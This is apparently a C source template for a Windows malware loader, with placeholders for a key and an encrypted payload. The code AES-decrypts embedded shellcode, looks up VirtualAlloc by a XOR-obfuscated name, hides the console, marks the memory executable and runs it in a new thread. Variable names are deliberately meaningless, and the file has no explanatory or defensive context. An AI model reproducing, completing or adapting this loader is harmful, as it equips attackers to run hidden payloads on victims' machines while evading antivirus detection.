#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <string.h>
#include <tlhelp32.h>

LPVOID (WINAPI * Virt_Alloc)(  LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);

char XOR_VARIABLE []= "XOR_KEY";

unsigned char Random9 []= VIRALO}; 


int Random1(char * different, unsigned int different_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, different, &different_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


void RandomA(char * tada, int tada_len, char * XOR_VARIABLE, size_t XOR_VARIABLE_len) {
        int r;
        r = 0;
        for (int i = 0; i < tada_len; i++) {
                if (r == XOR_VARIABLE_len - 1) r = 0;

                tada[i] = tada[i] ^ XOR_VARIABLE[r];
                r++;
        }
}

int main(void) {
	
	void * Random6_mem;
	BOOL Random8;
	HANDLE th;
        DWORD oldprotect = 0;
	
	
	char Random2[] = KEYVALUE
	unsigned char Random3[] = PAYVAL
	unsigned int Random7_len = sizeof(Random3);
	
	int pido = 0;
        HANDLE hProc = NULL;	
	
	int processors();
	
	strrev(Random3);
	FreeConsole();
	strrev(Random3);

	RandomA((char *) Random9, sizeof (Random9), XOR_VARIABLE, sizeof(XOR_VARIABLE));
        Virt_Alloc= GetProcAddress(GetModuleHandle("kernel32.dll"), Random9);

	Random6_mem = Virt_Alloc(0, Random7_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	Random1((char *) Random3, Random7_len, Random2, sizeof(Random2));
		

	RtlMoveMemory(Random6_mem, Random3, Random7_len);
	

	Random8 = VirtualProtect(Random6_mem, Random7_len, PAGE_EXECUTE_READ, &oldprotect);

	if ( Random8 != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Random6_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}
	
	return 0;
}
	
